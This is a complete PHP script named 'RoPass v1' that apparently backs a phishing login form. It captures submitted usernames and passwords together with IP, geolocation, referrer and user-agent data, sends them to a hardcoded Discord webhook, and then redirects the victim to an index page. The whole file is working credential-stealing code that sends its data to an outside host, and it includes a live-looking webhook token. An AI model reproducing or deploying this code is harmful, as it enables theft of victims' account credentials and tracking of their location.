<?php
function getPublicIP() {
    return file_get_contents('https://api.ipify.org');
}

function getGeolocation($ip) {
    $url = "https://ipapi.co/{$ip}/json/";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

function logData($username, $password) {
    $publicIP = getPublicIP();
    $rem_port = $_SERVER['REMOTE_PORT']; 
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $date = date("Y/m/d G:i:s"); 
    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';
    
    $locationInfo = getGeolocation($publicIP);
    $latitude = $locationInfo['latitude'] ?? 'N/A';
    $longitude = $locationInfo['longitude'] ?? 'N/A';

    $logMessage = [
        "username" => $username,
        "password" => $password,
        "public_ip" => $publicIP,
        "geolocation" => $locationInfo,
        "latitude" => $latitude,
        "longitude" => $longitude,
        "referrer" => $referrer,
        "port" => $rem_port,
        "date" => $date,
        "user_agent" => $user_agent
    ];

    sendToDiscordWebhook($logMessage);
}

function sendToDiscordWebhook($data) {
    $webhookUrls = [
        'https://discord.com/api/webhooks/1452357803518984326/iS4zw53NFdePdMFmR5rfRBgTBcG8SQIJNwXZkVhsUOEme4Can0H4r7Z7GekR-vvZ0GSF',  // Replace with your actual Discord webhook URL
    ];

    $embed = [
        "title" => "RoPass v1",
        "color" => hexdec("3762dc"),
        "fields" => [
            ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
            ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
            ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
            ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
            ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
            ["name" => "📡 Port", "value" => "`" . $data['port'] . "`", "inline" => true],
            ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
            ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],
        ],
        "image" => [
            "url" => "https://i.imgur.com/8TqBJyU.png"
        ],
    ];

    $json_data = json_encode(["embeds" => [$embed]]);

    foreach ($webhookUrls as $webhookUrl) {
        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($json_data)
        ]);
        
        $response = curl_exec($ch);
        if ($response === false) {
            error_log('Curl error: ' . curl_error($ch));
        } else {
            error_log('Response from Discord: ' . $response);
        }
        curl_close($ch);
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = test_input($_POST["username"]);
    $password = test_input($_POST["password"]);

    if (!empty($username) && !empty($password)) {
        logData($username, $password);
        header('Location: index.html');
        exit();
    }
}

function test_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}
?>
